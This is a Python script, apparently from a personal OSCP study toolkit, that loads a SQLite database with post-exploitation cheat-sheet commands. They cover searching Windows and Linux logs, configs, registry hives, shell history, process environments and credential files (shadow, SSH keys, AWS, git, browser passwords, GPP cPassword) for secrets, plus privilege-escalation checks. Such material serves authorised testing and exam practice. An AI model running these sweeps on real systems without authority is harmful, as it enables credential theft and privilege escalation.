    ("logs", "MySQL general query log (ALL queries — may contain creds)", "/var/log/mysql/mysql.log | check: SHOW VARIABLES LIKE 'general_log_file';", "logs", "logs,linux,mysql,query,general,mysql-logs,linux-logs"),
    ("logs", "Cron: grep syslog for cron entries (commands run + timing)", "grep -i 'cron' /var/log/syslog | tail -100", "logs", "logs,linux,cron,grep,syslog,cron-logs,linux-logs"),
    ("logs", "SSH: all successful logins from auth.log", "grep 'Accepted' /var/log/auth.log", "logs", "logs,linux,ssh,accepted,logon,ssh-logs,linux-logs"),
    ("logs", "SSH: extract source IPs from failed logins", "grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -20", "logs", "logs,linux,ssh,ips,brute,source,ssh-logs,linux-logs"),
    ("logs", "Grep ALL log files for credentials (Linux)", "grep -rni 'password\\|passwd\\|secret\\|api_key\\|token\\|credential' /var/log/ 2>/dev/null", "logs", "logs,linux,grep,all,creds,password,linux-logs"),
    ("logs", "Find recently modified log files (last 30 min)", "find /var/log -mmin -30 -type f 2>/dev/null", "logs", "logs,linux,recent,modified,find,linux-logs"),
    ("logs", "Tomcat catalina log (startup errors + creds in stack traces)", "/opt/tomcat/logs/catalina.out", "logs", "logs,linux,tomcat,catalina,error,java,tomcat-logs,linux-logs"),
    ("logs", "Mail: grep log for SASL auth (SMTP credentials in transit)", "grep -i 'sasl\\|authentication\\|login' /var/log/mail.log", "logs", "logs,linux,mail,sasl,smtp,creds,mail-logs,linux-logs"),
]

# ─────────────────────────────────────────────
# CONFIG FILES (from add_config_files.py - key entries)
# ─────────────────────────────────────────────
CONFIGS = [
    # Windows unattend
    ("config", "Unattend.xml — admin password from Windows setup (base64 or cleartext)", "C:\\Windows\\Panther\\Unattend.xml", "configs", "config,windows,unattend,xml,creds,setup,windows-config"),
    ("config", "Sysprep unattend.xml — admin password", "C:\\Windows\\System32\\sysprep\\unattend.xml", "configs", "config,windows,sysprep,unattend,xml,creds,windows-config"),
    ("config", "PowerShell: find all unattend files on disk", "Get-ChildItem -Recurse -ErrorAction SilentlyContinue -Include 'Unattend*','autounattend*','sysprep*' C:\\ | Select FullName", "configs", "config,windows,unattend,find,powershell,windows-config"),
    # IIS
    ("config", "IIS web.config — connection strings, machineKey, app settings", "C:\\inetpub\\wwwroot\\web.config", "configs", "config,windows,iis,web.config,connstring,machinekey,creds,iis-config,windows-config"),
    ("config", "IIS applicationHost.config — app pool identities, site bindings", "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config", "configs", "config,windows,iis,applicationhost,apppool,creds,iis-config,windows-config"),
    ("config", "ASP.NET appsettings.json — .NET Core DB/SMTP/API creds", "C:\\inetpub\\wwwroot\\appsettings.json", "configs", "config,windows,iis,aspnet,appsettings,json,creds,iis-config,windows-config"),
    ("config", "CMD: findstr for password/connstring in all web.config files", "findstr /si \"password\\|connectionString\\|machineKey\\|apikey\\|secret\" C:\\inetpub\\*.config C:\\inetpub\\**\\*.config 2>nul", "configs", "config,windows,iis,findstr,grep,creds,windows-config,config-grep"),
    # GPP
    ("config", "GPP Groups.xml — cPassword (decryptable with gpp-decrypt)", "\\\\<DC>\\SYSVOL\\<DOMAIN>\\Policies\\**\\Groups.xml", "configs", "config,windows,gpp,cpassword,groups,xml,creds,ad,windows-config"),
    ("config", "CMD: findstr cPassword across all SYSVOL XMLs", "findstr /si \"cPassword\" \\\\<DC>\\SYSVOL\\*.xml", "configs", "config,windows,gpp,cpassword,findstr,sysvol,windows-config,config-grep"),
    ("config", "Decrypt GPP cPassword on Kali", "gpp-decrypt <CPASSWORD_VALUE>", "configs", "config,windows,gpp,decrypt,kali,cpassword,windows-config"),
    # Registry
    ("config", "Registry: Winlogon autologon DefaultPassword", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword", "configs", "config,windows,registry,winlogon,autologon,password,creds,windows-config"),
    ("config", "Registry: AlwaysInstallElevated (both keys needed = privesc)", "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", "configs", "config,windows,registry,msi,elevated,privesc,windows-config"),
    ("config", "Registry: VNC password (TightVNC / UltraVNC)", "reg query HKCU\\Software\\TightVNC\\Server /v Password & reg query HKLM\\SOFTWARE\\RealVNC\\WinVNC4 /v Password", "configs", "config,windows,registry,vnc,password,creds,windows-config"),
    ("config", "Registry: PuTTY saved sessions", "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /s", "configs", "config,windows,registry,putty,sessions,creds,windows-config"),
    ("config", "Registry: PowerShell: search all hives for 'password'", "reg query HKLM /f password /t REG_SZ /s 2>nul; reg query HKCU /f password /t REG_SZ /s 2>nul", "configs", "config,windows,registry,search,password,creds,windows-config,config-grep"),
    # Windows user profile
    ("config", "PowerShell history — commands typed including inline creds", "%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt", "configs", "config,windows,powershell,history,creds,user,windows-config"),
    ("config", "FileZilla sitemanager.xml — FTP saved credentials (plaintext)", "%APPDATA%\\FileZilla\\sitemanager.xml", "configs", "config,windows,filezilla,ftp,xml,creds,user,windows-config"),
    ("config", "AWS CLI credentials file", "%USERPROFILE%\\.aws\\credentials", "configs", "config,windows,aws,credentials,keys,cloud,user,windows-config"),
    ("config", "Git credentials store — plaintext tokens", "%USERPROFILE%\\.git-credentials", "configs", "config,windows,git,credentials,token,plaintext,creds,user,windows-config"),
    ("config", "Chrome Login Data — SQLite DB with saved passwords", "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data", "configs", "config,windows,chrome,browser,passwords,sqlite,creds,user,windows-config"),
    # Windows sweep
    ("config", "CMD: recursive findstr for 'password' in common file types", "findstr /si \"password\" C:\\*.xml C:\\*.ini C:\\*.txt C:\\*.config C:\\*.conf C:\\*.cfg C:\\*.json 2>nul", "configs", "config,windows,findstr,grep,password,creds,sweep,windows-config,config-grep"),
    ("config", "PowerShell: recurse all drives for credential strings", "Get-ChildItem C:\\ -Recurse -ErrorAction SilentlyContinue -Include *.xml,*.ini,*.conf,*.config,*.cfg,*.json,*.txt,*.env | Select-String -Pattern 'password|passwd|secret|api_key|token|credential' | Select Path,LineNumber,Line | Out-File C:\\temp\\creds_found.txt", "configs", "config,windows,powershell,grep,creds,sweep,windows-config,config-grep"),
    # Linux /etc
    ("config", "/etc/passwd — user accounts + shells (world readable)", "/etc/passwd", "configs", "config,linux,passwd,users,shells,linux-config"),
    ("config", "/etc/shadow — hashed passwords (needs root)", "/etc/shadow", "configs", "config,linux,shadow,hashes,creds,linux-config"),
    ("config", "/etc/sudoers — sudo rules (all:all = instant root)", "/etc/sudoers", "configs", "config,linux,sudoers,sudo,privesc,linux-config"),
    ("config", "/etc/crontab — system-wide cron jobs (check for writable scripts)", "/etc/crontab", "configs", "config,linux,cron,crontab,privesc,linux-config"),
    ("config", "/etc/exports — NFS exported shares (check no_root_squash)", "/etc/exports", "configs", "config,linux,nfs,exports,privesc,linux-config"),
    ("config", "/etc/ssh/sshd_config — SSH config (PermitRootLogin, key paths)", "/etc/ssh/sshd_config", "configs", "config,linux,ssh,sshd,config,linux-config"),
    # Linux web stack
    ("config", "Apache .htpasswd — HTTP basic auth credentials", "find / -name '.htpasswd' 2>/dev/null", "configs", "config,linux,apache,htpasswd,creds,web,linux-config"),
    ("config", "WordPress wp-config.php — DB user/pass + secret keys", "/var/www/html/wp-config.php | find /var/www -name 'wp-config.php' 2>/dev/null", "configs", "config,linux,wordpress,php,web,creds,linux-config"),
    ("config", "Laravel .env — DB, mail, API keys, APP_KEY", "/var/www/html/.env | find /var/www -name '.env' 2>/dev/null", "configs", "config,linux,laravel,env,web,creds,linux-config"),
    ("config", "Django settings.py — SECRET_KEY, DB creds, allowed hosts", "find / -name 'settings.py' 2>/dev/null | grep -v '__pycache__'", "configs", "config,linux,django,python,web,creds,linux-config"),
    ("config", "MySQL my.cnf — root password, socket, bind address", "/etc/mysql/my.cnf | /etc/mysql/mysql.conf.d/mysqld.cnf", "configs", "config,linux,mysql,mycnf,creds,linux-config"),
    ("config", "PostgreSQL pg_hba.conf — auth methods (trust = no password needed)", "/etc/postgresql/*/main/pg_hba.conf", "configs", "config,linux,postgresql,pghba,auth,creds,linux-config"),
    ("config", "Tomcat tomcat-users.xml — manager credentials", "/opt/tomcat/conf/tomcat-users.xml | /etc/tomcat*/tomcat-users.xml", "configs", "config,linux,tomcat,java,users,xml,creds,linux-config"),
    ("config", "Jenkins credentials.xml — stored job credentials", "/var/lib/jenkins/credentials.xml", "configs", "config,linux,jenkins,credentials,xml,creds,linux-config"),
    # Linux user dot files
    ("config", "~/.bash_history — command history (inline creds very common)", "/root/.bash_history | /home/*/.bash_history", "configs", "config,linux,bash,history,creds,user,linux-config"),
    ("config", "~/.netrc — FTP/curl/wget stored credentials", "/home/*/.netrc | /root/.netrc", "configs", "config,linux,netrc,ftp,curl,creds,user,linux-config"),
    ("config", "~/.ssh/id_rsa — user SSH private key", "/home/*/.ssh/id_rsa | /root/.ssh/id_rsa", "configs", "config,linux,ssh,key,private,creds,user,linux-config"),
    ("config", "~/.aws/credentials — AWS access keys", "/home/*/.aws/credentials | /root/.aws/credentials", "configs", "config,linux,aws,credentials,keys,cloud,user,linux-config"),
    ("config", "~/.git-credentials — Git stored tokens (plaintext)", "/home/*/.git-credentials | /root/.git-credentials", "configs", "config,linux,git,credentials,token,plaintext,creds,user,linux-config"),
    # Linux proc
    ("config", "/proc/*/environ — running process environment variables", "cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'pass|key|token|secret'", "configs", "config,linux,proc,environ,env,creds,linux-config"),
    ("config", "/proc/*/cmdline — process arguments (DB connection strings common)", "cat /proc/*/cmdline 2>/dev/null | tr '\\0' ' ' | grep -iE 'pass|password|secret|key'", "configs", "config,linux,proc,cmdline,args,creds,linux-config"),
    # Linux sweep
    ("config", "Grep config files for passwords (broad sweep)", "grep -rni 'password\\|passwd\\|pass\\s*=\\|secret\\|api_key\\|token\\|credential' /etc /opt /var/www /home /root 2>/dev/null --include='*.conf' --include='*.config' --include='*.cfg' --include='*.ini' --include='*.env' --include='*.php' --include='*.py' --include='*.rb' --include='*.xml' --include='*.json' --include='*.yml'", "configs", "config,linux,grep,sweep,password,creds,all,linux-config,config-grep"),
    ("config", "Grep all shell history files for inline credentials", "find /home /root -name '*_history' -readable 2>/dev/null | xargs grep -iE 'password|passwd|secret|key|token|curl.*-u|mysql.*-p|psql.*-W' 2>/dev/null", "configs", "config,linux,history,grep,creds,bash,linux-config,config-grep"),
    # PHP
    ("config", "PHP php.ini — find all php.ini files on system", "find / -name 'php.ini' 2>/dev/null", "configs", "config,linux,php,ini,find,php-config"),
    ("config", "PHP php.ini — check allow_url_fopen (enables remote file include)", "grep -i 'allow_url_fopen\\|allow_url_include\\|disable_functions\\|open_basedir' /etc/php/*/cli/php.ini 2>/dev/null", "configs", "config,linux,php,ini,lfi,rfi,security,php-config"),
    ("config", "PHP — WordPress wp-config.php key values to extract", "grep -E \"DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|AUTH_KEY|SECURE_AUTH_KEY|table_prefix\" /var/www/html/wp-config.php 2>/dev/null", "configs", "config,linux,php,wordpress,wp-config,grep,creds,php-config"),
    ("config", "PHP — find all PHP files with hardcoded DB credentials", "grep -rn \"\\$db_pass\\|\\$dbpass\\|\\$password\\|\\$db_password\\|mysql_connect\\|mysqli_connect\\|PDO(\" /var/www 2>/dev/null | grep -v '.min.js'", "configs", "config,linux,php,grep,hardcoded,db,creds,php-config,config-grep"),
    ("config", "PHP — find phpinfo pages in webroot", "find /var/www -name 'phpinfo.php' -o -name 'info.php' -o -name 'test.php' 2>/dev/null", "configs", "config,linux,php,phpinfo,find,php-config"),
    # Nginx
    ("config", "Nginx nginx.conf — main config", "/etc/nginx/nginx.conf", "configs", "config,linux,nginx,conf,main,nginx-config"),
    ("config", "Nginx — grep all configs for proxy_pass (reveals internal services)", "grep -rn 'proxy_pass' /etc/nginx/ 2>/dev/null", "configs", "config,linux,nginx,proxy,pass,internal,recon,nginx-config"),
    ("config", "Nginx — grep for SSL cert and key paths", "grep -rn 'ssl_certificate\\|ssl_certificate_key' /etc/nginx/ 2>/dev/null", "configs", "config,linux,nginx,ssl,cert,key,paths,nginx-config"),
    ("config", "Nginx — grep for server_name (find all hosted domains/subdomains)", "grep -rn 'server_name' /etc/nginx/sites-enabled/ /etc/nginx/conf.d/ 2>/dev/null", "configs", "config,linux,nginx,server,name,domains,recon,nginx-config"),
    ("config", "Nginx — check if autoindex is on (directory listing enabled)", "grep -rn 'autoindex on' /etc/nginx/ 2>/dev/null", "configs", "config,linux,nginx,autoindex,directory,listing,nginx-config"),
    ("config", "Nginx — test config syntax and see effective config", "nginx -T 2>/dev/null  # dumps full merged config — huge recon value", "configs", "config,linux,nginx,test,dump,effective,recon,nginx-config"),
    ("config", "Nginx — check for alias path traversal (alias + no trailing slash = LFI)", "grep -rn -A1 'location.*{' /etc/nginx/sites-enabled/ 2>/dev/null | grep -B1 'alias'", "configs", "config,linux,nginx,alias,traversal,lfi,nginx-config"),
]


def build_gtfo_commands():
    """Convert gtfobins dicts into flat (tool, desc, cmd, cat, tags) tuples"""
    rows = []
    for tool, command in gtfobins_suid.items():
        rows.append((
            tool,
            f"{tool} SUID privilege escalation",
            command,
            "privesc-linux",
            f"suid,{tool},privesc,gtfobins"
        ))
    for tool, command in gtfobins_sudo.items():
        rows.append((
            tool,
            f"{tool} sudo privilege escalation",
            command,
            "privesc-linux",
            f"sudo,{tool},privesc,gtfobins"
        ))
    for tool, (cap, command) in gtfobins_caps.items():
        # make the tool name clean (strip _dac, _netraw etc suffixes for display)
        display_tool = tool.split("_")[0]
        rows.append((
            display_tool,
            f"{display_tool} {cap} capability privilege escalation",
            command,
            "privesc-linux",
            f"capabilities,cap,{cap},{display_tool},privesc,gtfobins"
        ))
    return rows


def main():
    if not os.path.exists(DB_PATH):
        print(f"[-] DB not found: {DB_PATH}")
        print("    Run oscp_db_setup.py first to create the database.")
        sys.exit(1)

    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()

    cur.execute("PRAGMA table_info(commands)")
    cols = [row[1] for row in cur.fetchall()]
    expected = {"tool", "description", "command", "category", "tags"}
    if not expected.issubset(set(cols)):
        print(f"[-] Schema mismatch. Found: {cols}")
        sys.exit(1)
    print(f"[*] Schema OK")

    # Build the full list
    all_commands = []
    all_commands += build_gtfo_commands()
    all_commands += OSCP_ALLOWED
    all_commands += NXC_EXTRA
    all_commands += DATABASES
    all_commands += LOGS
    all_commands += CONFIGS

    added = 0
    skipped = 0
    section_counts = {}

    for tool, desc, cmd, cat, tags in all_commands:
        cur.execute("SELECT COUNT(*) FROM commands WHERE command = ?", (cmd,))
        if cur.fetchone()[0] > 0:
            skipped += 1
            continue
        cur.execute(
            "INSERT INTO commands (tool, description, command, category, tags) VALUES (?, ?, ?, ?, ?)",
            (tool, desc, cmd, cat, tags),
        )
        added += 1
        section_counts[cat] = section_counts.get(cat, 0) + 1

    conn.commit()

    cur.execute("SELECT COUNT(*) FROM commands")
    total = cur.fetchone()[0]

    print(f"\n{'='*60}")
    print(f"  OSCP Master Patch - Freeworld / 1337 Pete")
    print(f"{'='*60}")
    print(f"\n[+] Added:   {added}")
    print(f"[~] Skipped: {skipped} (already in DB)")
    print(f"[=] Total commands in DB now: {total}")

    print(f"\n[*] New commands added per category:")
    for cat, count in sorted(section_counts.items()):
        print(f"    {cat:<22}  +{count}")

    print(f"\n[*] Full per-category totals:")
    cur.execute("SELECT category, COUNT(*) FROM commands GROUP BY category ORDER BY category")
    for row in cur.fetchall():
        print(f"    {row[0]:<22}  {row[1]}")

    conn.close()

    print(f"\n[*] Try the new capability entries:")
    print(f"    oscp capabilities")
    print(f"    oscp cap_setuid")
    print(f"    oscp cap_dac_read_search")
    print(f"    oscp python privesc")
    print(f"\n[*] Other useful searches:")
    print(f"    oscp nxc")
    print(f"    oscp bloodyAD")
    print(f"    oscp ligolo")
    print(f"    oscp windows config")
    print(f"    oscp linux config")
    print(f"    oscp mysql")
    print(f"    oscp redis")
    print(f"    oscp nginx config")
    print(f"    oscp gpp cpassword")
    print(f"    oscp unattend")
    print(f"    oscp windows logs")
    print(f"    oscp linux cron")


if __name__ == "__main__":
    print("\n" + "=" * 60)
    print("OSCP Master Patch - All patches combined")
    print("Freeworld / 1337 Pete — Allergic to aluminum baby")
    print("=" * 60 + "\n")
    main()
